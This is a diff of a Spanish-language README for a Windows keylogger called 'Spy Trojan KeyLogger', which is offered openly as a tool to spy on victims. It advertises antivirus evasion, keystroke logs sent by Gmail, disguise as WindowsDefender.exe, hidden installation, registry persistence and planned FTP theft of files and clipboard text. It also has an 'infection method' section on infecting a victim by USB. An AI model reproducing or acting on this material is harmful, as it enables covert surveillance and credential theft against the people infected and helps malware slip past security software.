@@ -1,11 +1,12 @@
 ````
 █▀ █▀█ █▄█   ▀█▀ █▀█ █▀█ ░░█ ▄▀█ █▄░█   █▄▀ █▀▀ █▄█ █░░ █▀█ █▀▀ █▀▀ █▀▀ █▀█
-▄█ █▀▀ ░█░   ░█░ █▀▄ █▄█ █▄█ █▀█ █░▀█   █░█ ██▄ ░█░ █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄ v3.2.0     
+▄█ █▀▀ ░█░   ░█░ █▀▄ █▄█ █▄█ █▀█ █░▀█   █░█ ██▄ ░█░ █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄ v3.3.3     
 ````
 ---
 ---
 * __Nombre:__ `Spy Trojan KeyLogger`
-* __Documentación:__ `14/05/2020`
+* __Versión:__ `3.3.3`
+* __Documentación:__ `16/05/2020`
 * __Plataforma:__` Windows 7, 8.1 y 10`
 * __Lenguaje:__`Python 3.8`
 
@@ -17,31 +18,32 @@ Las razones por las cuales existen los Keyloggers, tienen como fin la seguridad 
 ---
 ---
 # Carpeta Principal
-![Archivos](https://i.imgur.com/sKQ1TlX.png)
+![Archivos](https://i.imgur.com/PVN64Kv.png)
 - `Doc` = Documentación de como perzonalizar el keylogger `CustomKey.md`
 - `Compile.bat`    = Convierte el script `*.py` a `*.exe`
+- `DataCompartir.txt`    = Pequeña descripción del keylogger
 - `Ejecutar.bat`    = Ejecuta el script - [para pruebas]
 - `icon.ico`    = Icono Windows Defender
 - `LICENCE` = Licencia 
 - `README.md`= Documentación
 - `version.txt` = Información detalla de conversión `.py` a `.exe`
-- `WindowsDefender.py` = Código fuente del Keylogger
 - `WindowsDefender.exe` = Keylogger Compilado `3.2.0`
+- `WindowsDefender.py` = Código fuente del Keylogger
 ---
 ---
 # Caracteristicas
 - __Indetectable Antivirus:__ Windows Defender `02/05/2020`, Avast, ESET NOD32
-- __Envío por Gmail:__ Envía el registro de teclas por Gmail en un `.key`.
+- __Envío por Gmail:__ Envía el registro de teclas por Gmail en un `.k`.
 
-  ![correo](https://i.imgur.com/rKeYzVx.png)
+  ![Correo ejemplo del Keylogger](https://i.imgur.com/HCyUK2M.png)
 
 - __Recibe datos por varios correos:__ Hay una posibilidad de agregar 1 o más correos, y así el registro de teclas se envíe a varios correos a la vez.
 - __Verifica conexión a internet:__ El keylogger verifica si la computadora está conectada a internet, y si ese es el caso envía los datos, en caso contrario, no lo envía,
 - __Tiempo de envío personalizado:__ Usted puede elegir un intervalo de tiempo personalizado, en la cual desea que se envíe los archivos, `No se recomienta que sean muy seguidos, ya que el servidor de mensajería de google, bloqueará la cuenta por 1 día,  por eso el tiempo de intervalo de envío escogida es de 2 Horas, éstas horas se cuentan despues de iniciar el script`
-- __Obtención de datos a prueba de errores:__ En otros keylogger al momento de enviar el `.key`, éste proceso demora entre 3 a 5 segundos, y en ese transcurso de tiempo el keylogger no obtiene el registro de teclas, en éste keylogger, ese error está solucionado, obteniendo siempre los datos, verifique [aqui](InfoKey.md) la lista de teclas que obtiene 
+- __Obtención de datos a prueba de errores:__ En otros keylogger al momento de enviar el `.k`, éste proceso demora entre 3 a 5 segundos, y en ese transcurso de tiempo el keylogger no obtiene el registro de teclas, en éste keylogger, ese error está solucionado.
 - __Segundo plano:__ Este keylogger, al ejecutarse en la linea de comando, sí mostrará una consola, solo por detalles de debuggeo, pero al ser compilada de `*.py` a `*.exe` el ejecutable resultante se ejecutará en segundo plano
 - __Disfraz:__ Al momento de ser convertido de `*.py a *.exe`. El Keylogger será disfrazado como `WindowsDefender.exe` con el ícono y la información del programa.
-- __Oculto:__ El Keylogger al iniciar se copia (Solo si ya está en un archivo *exe) a la carpeta `"C:\Users\Public\Security\Windows Defender\"` , y en esa carpeta encuentras el archivo `.key`.
+- __Oculto:__ El Keylogger al iniciar se copia (Solo si ya está en un archivo *exe) a la carpeta `"C:\Users\Public\Security\Windows Defender\"` , y en esa carpeta encuentras el archivo `.k`.
 
 - __Iniciar automaticamente con el sistema:__ Modifica el registro de windows
 - __Segundo Gmail en caso de Error:__ En casó el correo principal sea bloqueada o tenga x problemas, se usará un segundo correo.
@@ -50,13 +52,14 @@ Las razones por las cuales existen los Keyloggers, tienen como fin la seguridad 
 ## Caracteristicas en futuras actualizaciones: 
 - __Conexión a una base de datos MySQL:__ Los datos recopilados serán enviados por una conexión a una base de datos en vez de por mensajes.  
 - __Soporte de envió a otros buzones de correo:__ Se insertará un soporte para poder usar Outlook, yahoo u otros servicios de correo 
-- __Conexión FTP:__ Envía el archivo `.key` vía FTP.
+- __Conexión FTP:__ Envía el archivo `.k` vía FTP.
 - __Envía datos mediante FTP:__ enviará documentos, fotos y videos mediante una conexión FTP, en segundo plano.
 - __Portapapeles:__ Obtiene el texto del portapapeles.
 
 ## Uso de Recursos de la PC
 El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución
-![Uso del CPU y RAM](https://i.imgur.com/xMRxzX3.png)
+
+![Uso del CPU y RAM](https://i.imgur.com/DFAf2Tw.png)
 
 ---
 ---
@@ -108,7 +111,7 @@ def ReceiveE():
 # Método de infección:
 ___¿Cómo infecto a la victima?___
 
-![Final files](https://i.imgur.com/Ux5ya2w.png)
+![Final files](https://i.imgur.com/TlBEAaS.png)
 
 __Nota:__ No cambiar de nombre al archivo `WindowsDefender.exe`, si usted le cambia el nombre, el Keylogger quedará obsoleto.
 - Usten guardará el archivo en un USB.
